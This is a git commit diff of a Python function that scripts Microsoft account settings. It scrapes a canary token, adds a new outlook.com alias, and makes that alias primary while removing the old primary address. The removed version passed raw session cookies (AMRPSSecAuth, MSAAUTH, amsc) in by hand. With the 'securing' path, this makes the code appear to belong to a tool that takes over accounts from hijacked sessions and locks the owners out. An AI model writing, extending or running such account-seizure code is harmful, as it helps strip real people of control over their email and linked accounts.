b6fef318106a9a556a8395a72f2cf2bfdfea10a8
salomao31 <salomaoiogourte31@gmail.com>
2026-02-01 21:08:05 +0000

    Critical Fix

--- views/utils/securing/changePrimaryAlias.py
+++ views/utils/securing/changePrimaryAlias.py
@@ -2,114 +2,67 @@ import urllib.parse
 import httpx
 import re
 
-async def changePrimaryAlias(emailName: str, msaauth: str, amrp: str, apicanary: str, amsc: str):
+async def changePrimaryAlias(session: httpx.AsyncClient, emailName: str, apicanary: str) -> bool:
 
-    async with httpx.AsyncClient(timeout=None) as session:
+    try:
+        getCanary = await session.get(
+            url = "https://account.live.com/AddAssocId",
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+        )
 
-        try:
-            getCanary = await session.get(
-                url = "https://account.live.com/AddAssocId",
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Cookie": f"AMRPSSecAuth={amrp}; amsc={amsc}"
-                }
-            )
+        canary = urllib.parse.quote(
+            re.search(
+                r'name="canary" value="([^"]+)"', 
+                getCanary.text
+            ).group(1),
+            safe = ""
+        ) 
 
-            if getCanary.status_code == 302:
+        # Add Email
+        await session.post(
+            url="https://account.live.com/AddAssocId?ru=&cru=&fl=",
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://account.live.com",
+                "Referer": "https://account.live.com/AddAssocId"
+            },
+            data=f"canary={canary}&PostOption=LIVE&SingleDomain=&UpSell=&AddAssocIdOptions=LIVE&AssociatedIdLive={emailName}&DomainList=outlook.com"
+        )
 
-                location = getCanary.headers["Location"]
-                redirect = await session.get(
-                    url = location
-                )
+        # Make Primary
+        pinfo = await session.post(
+            url = "https://account.live.com/API/MakePrimary",
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest",
+                "Accept": "application/json",
+                "hpgid": "200176",
+                "scid": "100141",
+                "uiflvr": "1001",
+                "canary": apicanary
+            },
+            json = {
+                "aliasName": f"{emailName}@outlook.com",
+                "emailChecked": True,
+                "removeOldPrimary": True,
+                "uiflvr":1001,
+                "scid":100141,
+                "hpgid":200176
+            }
+        )
 
-                location = redirect.headers["Location"]
-                redirect = await session.get(
-                    url = location,
-                    headers = {
-                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                        "Connection": "keep-alive",
-                        "Cookie": f"__Host-MSAAUTH={msaauth}; amsc={amsc}"
-                    }
-                )
-
-                with open("RESPONSE.txt", "w+") as file:
-                    file.write(redirect.text)
-
-                FMHF = urllib.parse.quote(re.search(r'<input[^>]*name="code"[^>]*value="([^"]+)"', redirect.text).group(1))
-                OpenIDConnect = urllib.parse.quote(re.search(r'<input[^>]*name="state"[^>]*value="([^"]+)"', redirect.text).group(1), safe="")
-
-                redirect = await session.get(
-                    url = "https://account.live.com/auth/redirect",
-                    headers = {
-                        "Cookie": f"amsc={amsc}"
-                    },
-                    data = f"code={FMHF}&state={OpenIDConnect}"
-                )
-
-                finalCanary = await session.get(
-                    url = "https://account.live.com/AddAssocId",
-                    headers = {
-                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "Cookie": f"AMRPSSecAuth={amrp}; amsc={amsc}"
-                    }
-                )
-
-                canary = urllib.parse.quote(
-                    re.search(
-                        r'name="canary" value="([^"]+)"', 
-                        finalCanary.text
-                    ).group(1),
-                    safe = ""
-                )
-
-            # Add Email
-            await session.post(
-                url="https://account.live.com/AddAssocId?ru=&cru=&fl=",
-                headers={
-                    "Cookie": f"AMRPSSecAuth={amrp}; amsc={amsc}",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Origin": "https://account.live.com",
-                    "Referer": "https://account.live.com/AddAssocId"
-                },
-                data=f"canary={canary}&PostOption=LIVE&SingleDomain=&UpSell=&AddAssocIdOptions=LIVE&AssociatedIdLive={emailName}&DomainList=outlook.com",
-                timeout = None
-            )
-
-            # Make Primary
-            await session.post(
-                url = "https://account.live.com/API/MakePrimary",
-                headers = {
-                    "Cookie": f"AMRPSSecAuth={amrp}; amsc={amsc}",
-                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "X-Requested-With": "XMLHttpRequest",
-                    "Accept": "application/json",
-                    "hpgid": "200176",
-                    "scid": "100141",
-                    "uiflvr": "1001",
-                    "canary": apicanary
-                },
-                json = {
-                    "aliasName": f"{emailName}@outlook.com",
-                    "emailChecked": False,
-                    "removeOldPrimary": True,
-                    "uiflvr":1001,
-                    "scid":100141,
-                    "hpgid":200176
-                },
-                timeout=None
-            )
-
-            print("[+] - Changed Primary Email")
-            return True
-        
-        except Exception:
+        if "error" in pinfo.json():
+            print(f"[X] - Failed to change Primary Alias")
             return False
-        
+
+        return True
+    except Exception:
+        print(f"[X] - Failed to change Primary Alias")
+        return False
+
 
 
 
     
-
